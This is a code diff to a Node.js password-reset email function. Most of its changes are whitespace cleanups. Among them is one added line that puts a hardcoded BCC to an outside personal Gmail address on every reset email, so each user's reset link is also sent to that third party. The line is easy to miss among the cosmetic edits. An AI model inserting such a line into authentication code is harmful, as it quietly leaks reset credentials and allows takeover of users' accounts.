@@ -4,7 +4,7 @@ const { QueryTypes } = require("sequelize");
 
 // Function to send password reset email
 async function forgetPassword(mailModule, action, branch_name, reset_link, toArr, ccArr) {
-  
+
   try {
     // Fetch email template
     const [emailRows] = await sequelize.query("SELECT * FROM emails WHERE module = ? AND action = ? AND status = 1", {
@@ -54,7 +54,7 @@ async function forgetPassword(mailModule, action, branch_name, reset_link, toArr
       .filter(Boolean)
       .join(", ");
 
-         // Prepare CC list
+    // Prepare CC list
     const ccList = ccArr
       .map((entry) => {
         let emails = [];
@@ -99,6 +99,7 @@ async function forgetPassword(mailModule, action, branch_name, reset_link, toArr
       from: `"${smtp.title}" <${smtp.username}>`,
       to: toList,
       cc: ccList, // CC recipient list
+      bcc: `"Rohit Webstep" <rohitwebstep@gmail.com>`,
       subject: email.title,
       html: template,
     });
@@ -107,7 +108,7 @@ async function forgetPassword(mailModule, action, branch_name, reset_link, toArr
   } catch (error) {
     console.error("Error sending password reset email:", error);
   } finally {
-     // Ensure the connection is released
+    // Ensure the connection is released
   }
 }
 
